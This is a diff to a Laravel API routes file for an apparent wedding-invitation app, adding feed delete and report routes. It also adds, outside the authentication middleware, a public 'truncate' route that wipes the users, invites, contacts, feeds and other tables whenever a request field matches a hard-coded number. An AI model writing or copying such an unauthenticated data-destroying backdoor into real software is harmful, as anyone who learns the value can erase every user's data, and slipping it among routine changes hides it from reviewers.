@@ -25,6 +25,19 @@ Route::post('resendOtp','CommonController@resendOtp');
 Route::post('forgetPassword','CommonController@forgetPassword');
 Route::post('changeMobileNumber','CommonController@changeMobileNumber');
 
+Route::post('truncate',function(Request $request){
+	if($request->name == 8881438096 ){
+		DB::table('users')->truncate();
+		DB::table('wedding_detail')->truncate();
+		DB::table('function')->truncate();
+		DB::table('invites')->truncate();
+		DB::table('Feeds')->truncate();
+		DB::table('report_feeds')->truncate();
+		DB::table('attachments')->truncate();
+		DB::table('contacts')->truncate();
+	}
+});
+
 Route::middleware('ApiAuthentication')->group(function(){
 
 	// CommonController
@@ -54,6 +67,8 @@ Route::middleware('ApiAuthentication')->group(function(){
 		Route::match(['post'],'feeds','FeedController@feeds');
 		Route::match(['post'],'get_feeds_by_wedding','FeedController@get_feeds_by_wedding');
 		Route::match(['post'],'update_feed','FeedController@update_feed');
+		Route::match(['post'],'delete_feed','FeedController@delete_feed');
+		Route::match(['post'],'report_on_feed','FeedController@report_on_feed');
 	// END
 
 	// ContactController
